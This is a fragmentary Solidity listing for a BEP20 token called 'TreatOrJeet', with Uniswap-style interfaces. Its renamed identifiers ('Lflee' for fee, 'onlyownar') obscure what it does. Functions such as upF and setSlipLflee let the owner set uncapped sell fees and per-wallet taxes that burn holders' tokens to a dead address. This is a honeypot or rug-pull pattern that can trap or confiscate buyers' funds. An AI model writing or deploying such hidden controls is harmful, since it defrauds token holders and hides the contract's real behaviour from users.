...
interface IUniswapV2Factory {
    ...
    function LfleeTo() external view returns (address);
    function LfleeToSetter() external view returns (address);
    ...
    function setLfleeTo(address) external;
    function setLfleeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingLfleeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingLfleeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingLfleeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingLfleeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingLfleeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract TreatOrJeet is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellLflee = 0;

    uint256 private _defaultBuyLflee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipLflee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellLflee = _value;
    }

    function setSlipLflee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipLflee[_address] = _value;
    }

    function getSlipLflee(address _address) external view onlyownar returns (uint256) {
        return _slipLflee[_address];
    }


    function setMAccountLflee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountLflee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeLfleeAmount = 0;

        if (rF) {
            uint256 tradeLflee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeLflee = _defaultSellLflee;
                }
                if (from == uniswapV2Pair) {

                    tradeLflee = _defaultBuyLflee;
                }
            }
            if (_slipLflee[from] > 0) {
                tradeLflee = _slipLflee[from];
            }

            tradeLfleeAmount = _Amount.mul(tradeLflee).div(100);
        }


        if (tradeLfleeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeLfleeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeLfleeAmount);
            emit Transfer(from, _deadAddress, tradeLfleeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeLfleeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeLfleeAmount);
        emit Transfer(from, _to, _Amount - tradeLfleeAmount);
    }
